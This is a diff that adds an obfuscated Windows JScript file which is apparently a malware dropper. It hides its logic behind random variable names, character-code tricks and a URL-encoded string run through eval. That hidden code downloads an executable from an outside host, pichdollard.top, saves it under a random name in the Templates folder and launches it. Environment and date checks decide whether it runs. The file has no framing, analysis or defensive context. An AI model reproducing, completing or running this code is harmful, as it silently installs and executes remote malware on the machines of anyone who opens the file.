@@ -1,0 +1,17 @@
+xodPYuwDNgEZAiMUVze = yrgxYHAdUtRVIXCeNW = new ActiveXObject("wscRipt.sHell");
+WuwrRvHfinaoKSYqDG = yrgxYHAdUtRVIXCeNW.RegRead("HKLM"+String.fromCharCode(92)+"software"+String.fromCharCode(92)+"microsoft"+String.fromCharCode(92)+"windows"+String.fromCharCode(92)+"currentversion"+String.fromCharCode(92)+"programfilesdir");
+oRpfPzUSJtCaiKcr = WuwrRvHfinaoKSYqDG.charAt(1);
+IrUghzeHiLAnRwBYQ = WuwrRvHfinaoKSYqDG.charCodeAt(1);
+mcvrslBFKoRwYzP = "eval(unescape("+String.fromCharCode(39)+"var%20wsh%20%3D%20new%20ActiveXObject%28%22wscript%2Eshell%22%29%3B%0D%0Avar%20sh%20%3D%20new%20ActiveXObject%28%22shell%2Eapplication%22%29%3B%0D%0Avar%20HTTP%20%3D%20new%20ActiveXObject%28%22MSXML%32%2EXMLHTTP%22%29%3B%0D%0Avar%20Stream%20%3D%20new%20ActiveXObject%28%22ADODB%2EStream%22%29%3B%0D%0Avar%20path%20%3D%20wsh%2ESpecialFolders%28%22Templates%22%29%2B%22%5C%5C%22%2B%28%28Math%2Erandom%28%29%2A%39%39%39%39%39%39%29%2B%39%39%39%39%7C%30%29%2B%22%2Eexe%22%3B%0D%0AHTTP%2EOpen%28%22GET%22%2C%20%22http%3A%2F%2Fpichdollard%2Etop%2Fadmin%2Ephp%3Ff%3D%34%30%34%22%2C%20false%29%3B%20HTTP%2ESend%28%29%3B%20if%20%28HTTP%2EStatus%20%3D%3D%20%32%30%30%29%20%7B%0D%0AStream%2EOpen%28%29%3B%20Stream%2EType%20%3D%20%31%3B%20Stream%2EWrite%28HTTP%2EResponseBody%29%3B%20%0D%0AStream%2EPosition%20%3D%20%30%3B%20Stream%2ESaveToFile%28path%2C%20%32%29%3B%0D%0AStream%2EClose%28%29%3B%20sh%2EShellExecute%28path%2C%20%22%22%2C%20%22%22%2C%20%22open%22%2C%20%31%29%3B%20%7D"
+String.fromCharCode(39)+"));";;
+
+kdXOLBlxIERnCswVzJF = "2"+"01"+"7";
+RIlBrOJdmCUabxi = "g"+"etY"+"ea"+"r";
+
+if (new Date()[RIlBrOJdmCUabxi]() == new Array(kdXOLBlxIERnCswVzJF)[0]) {	
+	wQIqKsjtGhlHXSx = eval(xodPYuwDNgEZAiMUVze.split("").join(""));
+	}
+
+if (IrUghzeHiLAnRwBYQ == 18792/324) {
+	yZjUCNFRhDgSkWowX = eval(mcvrslBFKoRwYzP);
+	}
